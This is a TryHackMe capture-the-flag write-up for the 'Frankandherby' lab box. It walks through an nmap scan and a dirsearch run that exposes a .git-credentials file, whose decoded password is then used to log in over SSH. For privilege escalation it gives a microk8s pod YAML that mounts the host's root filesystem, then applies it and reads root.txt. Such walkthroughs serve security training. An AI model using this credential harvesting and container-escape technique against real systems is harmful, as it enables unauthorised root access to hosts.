# Frankandherby tryhackme write-up

Tryhackme Medium level box.

> Arunkumar R (0xarun)


### Nmap

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 04:13 IST
Nmap scan report for 10.10.73.198
Host is up (0.24s latency).

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
|_  256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
3000/tcp  open  ppp?
25000/tcp open  ssl/icl-twobase1?
31337/tcp open  http              nginx 1.21.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 365.62 seconds

```

Port 
3000 > Rocket.chat
31337 > Bootstrap

On port 31337 dirsearch got frank credentials

```bash
┌──(arundhanush㉿kali)-[~]
└─$ dirsearch -u http://10.10.73.198:31337/

  _|. _ _  _  _  _ _|_    v0.4.1                                                
 (_||| _) (/_(_|| (_| )                                                         
                                                                                
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 10877                                                            

Output File: /home/arundhanush/.dirsearch/reports/10.10.73.198/_21-11-06_04-15-38.txt

Error Log: /home/arundhanush/.dirsearch/logs/errors-21-11-06_04-15-38.log

Target: http://10.10.73.198:31337/
                                                                                
[04:15:39] Starting: 
[04:15:45] 200 -   50B  - /.git-credentials   
``` 

	┌──(arundhanush㉿kali)-[~/CTF/THM/frankandherby]
	└─$ cat git-credentials      
	http://frank:f%40an3-1s-E337%21%21@192.168.100.50

Url decode : http://frank:f@an3-1s-E337!!@192.168.100.50

ssh frank:f@an3-1s-E337!!

user.txt

### Privesc

```bash
frank@dev-01:/$ microk8s

Available subcommands are:
        add-node
        cilium
        config
        ctr
        dashboard-proxy
        dbctl
        disable
        enable
        helm
        helm3
        istioctl
        join
        juju
        kubectl
        leave
        linkerd
        refresh-certs
        remove-node
        reset
        start
        status
        stop
        inspect
```

microk8s kubectl get pods -o yaml

```bash
frank@dev-01:/$ microk8s kubectl get pods -o yaml

--------------------------snip----------------------
    containerStatuses:
    - containerID: containerd://d818cc5701ff129490daa0e67e60df465c5405c98e1e638586f91f48a81f091e
      image: localhost:32000/bsnginx:latest
      imageID: localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
---------------------------snip--------------------------
  selfLink: ""

```

pod yaml exploit

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
spec:
  containers:
  - name: shell
    image: localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
    command:
      - "bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /opt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory

```

lets do upload the malicious pod 

```bash
frank@dev-01:~$ microk8s kubectl apply -f pod.yaml 

pod/hostmount created
frank@dev-01:~$ 
frank@dev-01:~$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          74d
hostmount                           1/1     Running   0          22s
frank@dev-01:~$ microk8s kubectl exec -it hostmount /bin/bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@hostmount:/# cd /opt
root@hostmount:/opt# cd root/
root@hostmount:/opt/root# ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
root@hostmount:/opt/root/home/frank# cat /opt/root/root/root.txt 
THM{REDACTED}

```

roooted!